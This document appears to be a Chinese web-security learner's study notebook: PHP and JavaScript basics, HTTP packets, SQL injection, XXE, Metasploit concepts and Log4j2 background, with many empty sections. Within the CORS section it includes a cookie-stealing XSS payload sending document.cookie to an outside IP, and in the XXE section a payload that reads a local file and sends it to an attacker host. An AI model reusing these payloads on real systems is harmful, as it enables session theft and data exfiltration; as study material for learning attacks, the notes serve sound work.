### 语言

#### 1.PHP

数值数组：自动产生的下标

关联数组：自己定义的下表 定义方式

```php+HTML
$a=array(“a”=>”BMW”,”b”=>”TOYOTA”);
如需添加（在上面面命令外部）：$a[]="BYD";此添加项没有指定下标默认会从0开始。
取出单值：echo $a["a"];
输出所有：print_r($a);

```

 双引号内可以引用变量 （双引号内的\ 转义）单引号不可

###### 流程控制

循环

> 循环的三要素 初始值 结束时判断语句 自操作
> 循环体 — 循环时需要执行的代码

```php
1.while循环
初始值;
while(条件){
    循环体;
    增量;
}
例：
}
$i = 0;
while($i<10){
    echo $i."\n";
    $i++;
}
2.for循环
for(初始值;条件判断;增量)
    循环体;
{
for($j=0;$j<10;$j++){
    echo $j."\n";
    echo “<br>";
}
```

循环的中断以及跳过

```
跳过循环
使用continue关键字
终端循环
使用break关键字
```

![](https://cdn.jsdelivr.net/gh/PDX33/image/202305181752882.png)

![image-20230404064556373](https://cdn.jsdelivr.net/gh/PDX33/image/202305181752382.png)

获取数组的长度count（$a)

for循环获取字符长度：![image-20230404065204113](https://cdn.jsdelivr.net/gh/PDX33/image/202305181752340.png)

###### Function

![image-20230404074751977](https://cdn.jsdelivr.net/gh/PDX33/image/202305181752700.png)

函数有作用域。函数内部变量和函数外部变量不通用 

return 获得返回值而不打印 ![image-20230404075030814](https://cdn.jsdelivr.net/gh/PDX33/image/202305181753921.png)

若需打印在外部echo

###### 文件包含

![image-20230404092020470](https://cdn.jsdelivr.net/gh/PDX33/image/202305181753293.png)





###### 运算优先级

先









#### JS

![image-20230405192254277](https://cdn.jsdelivr.net/gh/PDX33/image/202305181753469.png)

调用函数，触发事件 

![image-20230405192325572](https://cdn.jsdelivr.net/gh/PDX33/image/202305181754516.png)

aaa随即会被更改为新的内容字样

+连接字符串



#### AJAX

异步：不和浏览器同步刷新



### 请求包 响应包

head之间识别用的是换行符

head和haed之间必须又空行









### 跨域

#### WebSocket







S









#### CORS



dede plhttps://www.likecs.com/show-308512178.html

http://127.0.0.1/plus/flink_add.php

后台http://127.0.0.1/dede/index.php



<img src='x' onerror=x=new Image();x.src="http://47.92.37.9:8080/1.php?"+document.cookie>



## Mysql





![image-20230410092405943](https://cdn.jsdelivr.net/gh/PDX33/image/202305181753375.png)

0x7e表示~

group_concat与limit不能合用

## XXE

> **一、XML外部实体注入**
>
> 二、XML介绍
>
> 。标签对大小写敏感
>
> 。标签必须闭合
>
> 。必须有根元素
>
> 

![image-20230420092705545](https://cdn.jsdelivr.net/gh/PDX33/image/202305181753697.png)

![image-20230420093215065](https://cdn.jsdelivr.net/gh/PDX33/image/202305181753396.png)对于有特殊符号的可以用加密读取

![image-20230420093540131](https://cdn.jsdelivr.net/gh/PDX33/image/202305181754732.png)



![image-20230420101702345](https://cdn.jsdelivr.net/gh/PDX33/image/202305181754499.png)

![image-20230420102435523](https://cdn.jsdelivr.net/gh/PDX33/image/202305181754000.png)

&#x25;

ip是攻击机的

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/1/1.txt" >
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.128:4001/?p=%file;'>">

docker-compose up -d 开环境

docker-compose down关环境

nc传文件  加IP < 要传的文件

## Metasploit

### 渗透测试阶段

1. 前期交互

   与客户确定测试的范围和目标。这个阶段最为关键的是需要让客户组织明确清晰地了解渗透测试涉及哪些目标。而这个阶段也为你提供了机会来说服客户走出全范围渗透测试的理想化愿景，选择更加现实可行的渗透测试目标来进行实际实施

2. 情报搜集阶段

   使用各种方法搜集将要攻击的客户组织信息包括社交媒体网络、Google Hacking技术、目标系统踩点等等。作为渗透测试者最为重要的一点是对目标系统的探查能力，包括获知它的行为模式、运行机理以及最终它可以如何被攻破。

3. 威胁建模阶段

   使用你在情报搜集阶段的信息来标识出目标系统上可能存在的安全漏洞和弱点。在进行威胁建模时，你将确定出最为高效得到攻击方法。

4. 漏洞分析阶段

   确定攻击方法之后，就要考虑如何取得目标系统的访问权。

5. 渗透攻击阶段

6. 后渗透攻击阶段

   

7. 报告阶段

   

   

   ##### **渗透测试模型**

   1. 黑盒测试

   2. 白盒测试

   3. 灰盒测试

      

   

### Metasploit基础

#### 专业术语

> 1. Exploit渗透攻击
> 2. Payload攻击载荷
> 3. shellcode
> 4. Module
> 5. Listener

Metasploit用户接口

包括终端、命令行和图形化界面

#### MSF终端

|  msf模块  |            |                          |
| :-------: | ---------- | ------------------------ |
|  exploit  | exp模块    | 漏洞利用                 |
| auxiliary | 辅助       | 扫描、信息收集、暴力破解 |
|   post    | 后渗透测试 |                          |
|  evasion  | 免杀       | （几乎不免杀了）很少用   |
| payloads  | 攻击载荷   | 生成攻击代码即木马       |
|           |            |                          |
|           |            |                          |
|           |            |                          |
|           |            |                          |
|           |            |                          |
|           |            |                          |
|           |            |                          |
|           |            |                          |
|           |            |                          |
|           |            |                          |

## CVE漏洞复现

#### CEV-2021-44228  Log4j2

###### 1.LDAP(Lightweight Directory Access Protocol)轻量级目录访问协议

sso单点登录适合BS架构即browser server

LDAP适合CS架构即Client Server（即一套账户密码走天下）端口一般7389



###### 2.JNDI

Naming Service:

用于根据名字找到位置、服务、信息、资源、对象 K V

基本操作：1.发布服务 名字和资源的映（）

zookeeper

​     